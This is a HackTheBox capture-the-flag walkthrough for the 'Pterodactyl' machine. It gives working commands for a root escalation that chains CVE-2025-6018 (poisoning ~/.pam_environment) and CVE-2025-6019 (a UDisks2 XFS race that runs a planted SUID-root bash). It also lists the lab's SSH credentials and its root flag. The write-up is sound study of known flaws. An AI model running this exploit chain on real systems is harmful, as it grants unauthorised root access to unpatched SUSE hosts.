# Pterodactyl - HackTheBox Walkthrough

**IP Address**: 10.129.4.99
**Difficulty**: Hard
**Date Completed**: 2026-03-10
**OS**: openSUSE (Linux 6.4.0-150600.23.65-default, SUSE Linux Enterprise 15)
**Season**: Season 10

---

## Summary

Pterodactyl is a Hard-difficulty HackTheBox machine running openSUSE/SUSE Linux Enterprise. The privilege escalation chain exploits two chained CVEs discovered by Qualys TRU in June 2025:

1. **CVE-2025-6018** (PAM/Polkit Active Session Bypass): Injecting XDG session environment variables via `~/.pam_environment` tricks `systemd-logind` into granting `allow_active` PolicyKit privileges to an SSH session, making it appear as a local physical console session.

2. **CVE-2025-6019** (libblockdev/UDisks2 XFS SUID Race Condition): With `allow_active` privileges, a crafted XFS image containing a SUID-root bash binary can be mounted via udisksctl. When `Filesystem.Resize` is triggered via D-Bus, libblockdev internally mounts the XFS filesystem at `/tmp/blockdev.*/` **without the nosuid flag**, allowing execution of the SUID binary to obtain root.

---

## Foothold

Initial access was obtained as user `phileasfogg3` via SSH with credentials found during enumeration:
- Username: `phileasfogg3`
- Password: `!QAZ2wsx`

---

## Privilege Escalation

### Phase 1: Tool Reconnaissance

First, identify available tools on the target:

```bash
# Available: udisksctl, gdbus, dd, unxz, xz, /sbin/mkfs.xfs, /usr/sbin/xfs_db
# NOT available: gcc (no compiler), mkfs.xfs in PATH (use /sbin/mkfs.xfs)
which udisksctl gdbus dd mkfs.xfs 2>/dev/null
find /sbin /usr/sbin -name "mkfs.xfs" 2>/dev/null
# → /sbin/mkfs.xfs
```

### Phase 2: PAM Environment Poisoning (CVE-2025-6018)

Create `~/.pam_environment` to poison the PAM session with XDG variables:

```bash
cat > ~/.pam_environment << 'EOF'
XDG_SEAT=seat0
XDG_VTNR=1
XDG_SESSION_TYPE=x11
XDG_SESSION_CLASS=user
EOF
```

Log out and reconnect via SSH. Verify the vars are active:

```bash
env | grep XDG
# XDG_VTNR=1
# XDG_SESSION_TYPE=x11
# XDG_SESSION_CLASS=user
# XDG_SEAT=seat0
```

Test that `allow_active` is now granted:

```bash
udisksctl loop-setup --file /tmp/test --no-user-interaction 2>&1
# Should now work without "Not authorized" error
```

### Phase 3: Create XFS Image with SUID Bash

Key challenge: the XFS root directory is owned by root:root and not writable by our user. Standard mounting tricks (unshare + losetup, user namespaces) fail because XFS mount requires real `CAP_SYS_ADMIN`.

**Solution**: Use `mkfs.xfs -p protofile` to pre-populate the XFS filesystem with the bash binary during format. The protofile specifies `uid=0 gid=0` for the file, so the XFS inode stores root ownership regardless of who runs mkfs.

```bash
# Create protofile that specifies bash with SUID 4555 perms, root:root ownership
cat > /tmp/xfs.proto << 'PROTO'
/
0 0
d--755 0 0
bash -u-555 0 0 /bin/bash
$
$
PROTO

# Create 300MB XFS image with bash pre-planted
dd if=/dev/zero of=/tmp/xpl.img bs=1M count=300 status=none
/sbin/mkfs.xfs -f -p /tmp/xfs.proto /tmp/xpl.img
```

Verify bash is planted (by mounting via udisksctl):

```bash
udisksctl loop-setup --file /tmp/xpl.img --no-user-interaction
udisksctl mount --block-device /dev/loop0 --no-user-interaction
ls -la /run/media/phileasfogg3/<UUID>/
# -r-sr-xr-x 1 root root 1012656 bash  ← SUID root!
udisksctl unmount --block-device /dev/loop0 --no-user-interaction
```

### Phase 4: Run the Race Condition (CVE-2025-6019)

The exploit has two concurrent parts. In a single script (or two terminals):

**Trigger (continuous Filesystem.Resize D-Bus calls)**:
```bash
while true; do gdbus call --system \
    --dest org.freedesktop.UDisks2 \
    --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
    --method org.freedesktop.UDisks2.Filesystem.Resize \
    0 '{}' 2>/dev/null; done &
```

**Watcher (scan for temporary mount and execute bash)**:
```bash
while true; do
    for d in /tmp/blockdev.*; do
        [ -d "$d" ] || continue
        if [ -x "$d/bash" ] 2>/dev/null; then
            "$d/bash" -p -c "id && cat /root/root.txt"
            break 2
        fi
    done
done
```

The Filesystem.Resize call causes libblockdev to temporarily mount the XFS filesystem at `/tmp/blockdev.XXXXX/` **without nosuid**, creating a window where the SUID bash can be executed with effective root (euid=0).

### Result

```
[HIT!] Found bash at: /tmp/blockdev.8I27L3/bash
uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)
```

## Root Flag

```
12768ca3a3f314e50a7d24d370b0f786
```

---

## CVEs Exploited

| CVE | Description | CVSS |
|-----|-------------|------|
| CVE-2025-6018 | PAM environment variable injection allows SSH session to gain `allow_active` polkit privileges | 7.8 |
| CVE-2025-6019 | libblockdev/UDisks2 mounts XFS without nosuid during Filesystem.Resize, allowing SUID binary execution | 7.8 |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| ssh / sshpass | Remote access to target |
| udisksctl | Loop device management and filesystem operations |
| gdbus | D-Bus method calls to trigger UDisks2 Filesystem.Resize |
| mkfs.xfs | XFS filesystem creation with protofile pre-population |
| dd | Create raw disk image file |
| bash -p | Execute SUID bash preserving elevated EUID |
| pexpect (Python) | Automated SSH interaction for exploit scripting |
| expect | Automated SSH session management |

---

## Key Takeaways / Lessons Learned

1. **mkfs.xfs protofile** (`-p protofile`) is a powerful technique to pre-populate XFS filesystems with files of arbitrary ownership/permissions without needing root to mount. This bypasses the standard "can't write to root-owned XFS root directory" problem.

2. **PAM environment file poisoning** on SUSE 15 is straightforward: `~/.pam_environment` is read by `pam_env.so` and XDG session variables are trusted by `systemd-logind` for polkit `allow_active` determination.

3. **UDisks2/libblockdev race condition**: The temporary mount at `/tmp/blockdev.*/` during Filesystem.Resize operations lacks nosuid - this is the key insecure configuration. The race is reliable and fast (hit on first iteration in this case).

4. **Tool path awareness**: On SUSE, many tools are in `/sbin/` or `/usr/sbin/` but not in a regular user's PATH. Always check with `find /sbin /usr/sbin -name <tool>` when a tool appears missing.

5. **Chained CVEs**: Neither CVE alone is sufficient - CVE-2025-6018 provides the `allow_active` privilege needed for CVE-2025-6019's udisksctl operations. The chain is elegant: SSH user → allow_active polkit → loop device setup → XFS race → root.

---

## Artifacts Left on Target

- `/tmp/xpl.img` - XFS disk image (300MB)
- `/tmp/xfs.proto` - mkfs.xfs protofile
- `/tmp/race.sh` - Race condition exploit script
- `/tmp/create_xfs.sh` - XFS creation script
- `/tmp/plant_xfs.sh` - Previous attempt scripts
- `~/.pam_environment` - PAM environment file (enables CVE-2025-6018)
- `/dev/loop0` - Loop device (may persist until reboot)

**Cleanup**: Remove `~/.pam_environment`, /tmp scripts, and /tmp/xpl.img; delete loop device with `udisksctl loop-delete --block-device /dev/loop0`.
